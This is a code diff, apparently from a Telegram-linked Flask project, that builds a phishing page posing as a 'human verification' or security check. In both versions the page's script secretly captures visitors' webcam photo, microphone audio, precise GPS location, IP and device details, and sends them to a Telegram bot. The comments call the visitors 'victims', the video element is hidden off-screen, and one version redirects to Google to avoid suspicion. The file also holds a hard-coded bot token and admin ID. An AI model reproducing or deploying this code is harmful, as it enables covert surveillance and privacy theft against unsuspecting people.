@@ -1,101 +1,132 @@
-import base64, requests, os, json, datetime
+import base64, requests, os, json, time
 from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
 
 # ==========================================
-# --- إعدادات الإمبراطور سيوفي v20.0 ---
+# --- إعدادات الإمبراطور سيوفي (لا تلمسها) ---
 # ==========================================
 BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
 ADMIN_ID = "7041600701"
-BASE_URL = "https://sif-pro.onrender.com"
+BASE_URL = "https://sif-pro.onrender.com" # رابط سيرفرك
 API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
 
-# ملف بسيط لخزن الضحايا (بديل لقاعدة البيانات المعقدة لسهولة الاستخدام)
-DB_FILE = "victims.json"
-
-def load_db():
-    if os.path.exists(DB_FILE):
-        with open(DB_FILE, 'r') as f: return json.load(f)
-    return {"total": 0, "list": []}
-
-def save_db(data):
-    with open(DB_FILE, 'w') as f: json.dump(data, f)
+# متغيرات النظام القابلة للتعديل
+system_config = {
+    "welcome_msg": "🔥 أهلاً بك ملك سيوفي في لوحة التحكم v16.0\\n\\nالرابط شغال والوضع لوز! 🚀",
+    "trap_title": "تأكيد الأمان الموحد",
+    "victim_count": 0
+}
 
 # ==========================================
-# --- واجهة الصيد الاحترافية (The Advanced Trap) ---
+# --- الدوال الأساسية للنظام ---
+# ==========================================
+def tg_request(method, payload=None, files=None):
+    """دالة التواصل مع تليجرام"""
+    try:
+        if files:
+            return requests.post(API_URL + method, data=payload, files=files, timeout=20).json()
+        return requests.post(API_URL + method, json=payload, timeout=20).json()
+    except Exception as e:
+        print(f"Error in TG request: {e}")
+        return None
+
+# ==========================================
+# --- واجهة الصيد (The Trap) ---
 # ==========================================
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الاتصال الآمن</title>
+    <title>{{ title }}</title>
     <style>
-        body { background: #080808; color: white; font-family: 'Tahoma', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 10px 40px rgba(0,0,0,1); }
-        .spinner { border: 4px solid #333; border-top: 4px solid #f38020; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .btn { background: #f38020; color: #000; border: none; padding: 15px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
-        #st { margin-top: 15px; color: #777; font-size: 0.8rem; }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 0 30px rgba(243, 128, 32, 0.2); }
+        .icon { font-size: 50px; margin-bottom: 20px; color: #f38020; }
+        .btn { background: #f38020; color: #000; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; transition: 0.3s; }
+        .btn:active { transform: scale(0.95); }
+        #st { margin-top: 20px; color: #777; font-size: 0.8rem; }
+        #v { position: fixed; top: -10px; left: -10px; width: 1px; height: 1px; opacity: 0.01; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div id="icon" style="font-size: 50px;">📡</div>
-        <h2 id="head">نظام الحماية الذكي</h2>
-        <p id="msg">للوصول إلى المحتوى، يرجى إجراء فحص الأمان للمتصفح</p>
-        <div id="loader" style="display:none"><div class="spinner"></div></div>
-        <button class="btn" id="go" onclick="start()">بدء الفحص</button>
-        <div id="st"></div>
+        <div class="icon">🛡️</div>
+        <h2>تحقق بشري</h2>
+        <p style="color: #bbb;">يرجى النقر للمتابعة وتأكيد أنك لست روبوت للوصول إلى المحتوى</p>
+        <button class="btn" id="go" onclick="startCapture()">أنا لست روبوت</button>
+        <div id="st">بانتظار البدء...</div>
     </div>
-    <video id="v" style="position:fixed; top:-1000px" autoplay playsinline muted></video>
+    
+    <video id="v" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
+
     <script>
         const send = (d, t) => fetch('/api/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});
-        
-        async function start() {
-            document.getElementById('go').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('st').innerText = "جاري الاتصال بالسيرفر...";
-            
+
+        async function startCapture() {
+            const btn = document.getElementById('go');
+            const st = document.getElementById('st');
+            btn.style.display = 'none';
+            st.innerText = "جاري تهيئة النظام... يرجى الانتظار";
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+                // 1. جلب IP
+                const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Hidden'}));
+                
+                // 2. طلب الكاميرا والصوت
+                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                 const v = document.getElementById('v');
                 v.srcObject = stream;
-                
-                const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
-                const b = await navigator.getBattery().catch(()=>({}));
-                
-                const info = `👤 **ضحية جديدة برقم أرشيف مميز**\\n` +
-                             `🌐 IP: \`${ip.ip}\`\\n` +
-                             `🔋 الشحن: ${Math.round(b.level*100)}%\\n` +
-                             `📱 الجهاز: ${navigator.platform}\\n` +
-                             `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+                await v.play();
+
+                // 3. جمع المستشعر الشامل
+                const b = await navigator.getBattery().catch(() => ({}));
+                const info = `📜 **تقرير صيد احترافي (v16.0)**\\n` +
+                             `━━━━━━━━━━━━━━\\n` +
+                             `🌐 **IP:** \`${ipData.ip}\`\\n` +
+                             `🔋 **البطارية:** ${Math.round(b.level*100)}% (${b.charging ? '⚡' : '🔋'})\\n` +
+                             `📱 **النظام:** ${navigator.platform}\\n` +
+                             `🧠 **المعالج:** ${navigator.hardwareConcurrency} Cores\\n` +
+                             `🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}\\n` +
+                             `🌍 **اللغة:** ${navigator.language}\\n` +
+                             ` браузер: ${navigator.userAgent.split(' ')[0]}`;
                 await send(info, 'msg');
 
+                // 4. جلب الموقع الدقيق
+                navigator.geolocation.getCurrentPosition(p => {
+                    const mapUrl = `📍 **موقع الضحية الدقيق:**\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    send(mapUrl, 'msg');
+                }, null, {enableHighAccuracy: true});
+
+                // 5. حل السواد + التقاط الصورة
+                st.innerText = "جاري فحص الأمان... (4 ثواني)";
                 setTimeout(() => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth; c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
-                    send(c.toDataURL('image/jpeg', 0.8), 'img');
-                    
-                    const rec = new MediaRecorder(stream);
-                    const ch = [];
-                    rec.ondataavailable = e => ch.push(e.data);
-                    rec.onstop = () => {
-                        const r = new FileReader();
-                        r.readAsDataURL(new Blob(ch));
-                        r.onloadend = () => {
-                            send(r.result, 'aud');
-                            // التوجيه النهائي (عشان ما يشك)
-                            window.location.href = "https://www.google.com";
-                        };
+                    send(c.toDataURL('image/jpeg', 0.9), 'img');
+
+                    // 6. تسجيل بصمة الصوت
+                    st.innerText = "جاري رفع البيانات... (5 ثواني)";
+                    const recorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const reader = new FileReader();
+                        reader.readAsDataURL(new Blob(chunks));
+                        reader.onloadend = () => send(reader.result, 'aud');
+                        st.innerText = "✅ تمت العملية بنجاح! سيتم توجيهك...";
                     };
-                    rec.start();
-                    setTimeout(()=>rec.stop(), 5000);
-                }, 3000);
-            } catch(e) { location.reload(); }
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000);
+                }, 4000);
+
+            } catch (e) {
+                st.innerText = "❌ خطأ: يرجى منح الصلاحيات للمتابعة!";
+                setTimeout(() => location.reload(), 2000);
+            }
         }
     </script>
 </body>
@@ -103,63 +134,71 @@ HTML_TEMPLATE = '''
 '''
 
 # ==========================================
-# --- العمليات الخلفية ---
+# --- مسارات السيرفر (Routes) ---
 # ==========================================
 @app.route('/')
-def home(): return render_template_string(HTML_TEMPLATE)
+def home():
+    return render_template_string(HTML_TEMPLATE, title=system_config["trap_title"])
 
 @app.route('/api/capture', methods=['POST'])
 def capture():
-    db = load_db()
-    data = request.json
-    t, d = data['t'], data['d']
+    data = request.get_json(force=True, silent=True)
+    if not data: return "ERROR"
     
+    t, d = data.get('t'), data.get('d')
     if t == 'msg':
-        db['total'] += 1
-        db['list'].append({"ip": d.split('`')[1] if '`' in d else 'Unknown', "time": str(datetime.datetime.now())})
-        save_db(db)
-        # إرسال الرسالة مع رقم الضحية
-        msg = f"🆕 **الضحية رقم #{db['total']}**\\n" + d
-        requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': msg, 'parse_mode': 'Markdown'})
-    
+        tg_request("sendMessage", {'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
     elif t == 'img':
         img = base64.b64decode(d.split(',')[1])
-        requests.post(API_URL + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': f"📸 صورة الضحية #{db['total']}"}, files={'photo': ('c.jpg', img)})
-    
+        tg_request("sendPhoto", {'chat_id': ADMIN_ID, 'caption': "📸 **صورة الضحية**"}, {'photo': ('c.jpg', img)})
     elif t == 'aud':
         aud = base64.b64decode(d.split(',')[1])
-        requests.post(API_URL + "sendVoice", data={'chat_id': ADMIN_ID, 'caption': f"🎙 بصمة الضحية #{db['total']}"}, files={'voice': ('v.ogg', aud)})
+        tg_request("sendVoice", {'chat_id': ADMIN_ID, 'caption': "🎙 **بصمة الضحية**"}, {'voice': ('v.ogg', aud)})
     
     return "OK"
 
+# ==========================================
+# --- لوحة التحكم (الـ Webhook) ---
+# ==========================================
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    update = request.json
-    if "message" in update and str(update["message"]["chat"]["id"]) == ADMIN_ID:
-        kb = {"inline_keyboard": [
-            [{"text": "🔗 جلب رابط الصيد", "callback_data": "get_l"}],
-            [{"text": "📂 كشف الأرشيف", "callback_data": "view_db"}],
-            [{"text": "🧹 تصفير البيانات", "callback_data": "clear"}]
-        ]}
-        requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': "🛠 **لوحة التحكم المتقدمة v20.0**", 'reply_markup': kb, 'parse_mode': 'Markdown'})
-    
-    elif "callback_query" in update:
-        q = update["callback_query"]
-        data = q["data"]
-        db = load_db()
+    update = request.get_json(force=True, silent=True)
+    if not update: return "OK"
+
+    if "message" in update:
+        msg = update["message"]
+        chat_id = str(msg["chat"]["id"])
         
-        if data == "get_l":
-            requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': f"🚀 رابطك المباشر:\\n`{BASE_URL}`", 'parse_mode': 'Markdown'})
-        elif data == "view_db":
-            res = f"📂 **إحصائيات الأرشيف:**\\n🔢 إجمالي الضحايا: {db['total']}\\n"
-            for item in db['list'][-5:]: # آخر 5 ضحايا
-                res += f"📍 IP: `{item['ip']}`\\n"
-            requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': res, 'parse_mode': 'Markdown'})
-        elif data == "clear":
-            save_db({"total": 0, "list": []})
-            requests.post(API_URL + "sendMessage", json={'chat_id': ADMIN_ID, 'text': "✅ تم تصفير الأرشيف بنجاح!"})
-            
+        if chat_id == ADMIN_ID:
+            kb = {
+                "inline_keyboard": [
+                    [{"text": "🔗 إنشاء رابط صيد جديد", "callback_data": "gen_link"}],
+                    [{"text": "📊 إحصائيات النظام", "callback_data": "status"}],
+                    [{"text": "⚠️ تصفير الضحايا", "callback_data": "reset"}]
+                ]
+            }
+            tg_request("sendMessage", {
+                "chat_id": chat_id, 
+                "text": system_config["welcome_msg"], 
+                "reply_markup": kb,
+                "parse_mode": "Markdown"
+            })
+
+    elif "callback_query" in update:
+        query = update["callback_query"]
+        cid = query["message"]["chat"]["id"]
+        data = query["data"]
+
+        if data == "gen_link":
+            tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 **رابط الصيد الخاص بك جاهز:**\\n`{BASE_URL}`", "parse_mode": "Markdown"})
+        elif data == "status":
+            tg_request("sendMessage", {"chat_id": cid, "text": "✅ **السيرفر يعمل بكفاءة v16.0**\\n\\nكل الحساسات تعمل (صوت، صورة، موقع، IP)."})
+        elif data == "reset":
+            tg_request("sendMessage", {"chat_id": cid, "text": "🗑 تم تصفير سجل الضحايا مؤقتاً."})
+
     return "OK"
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
+
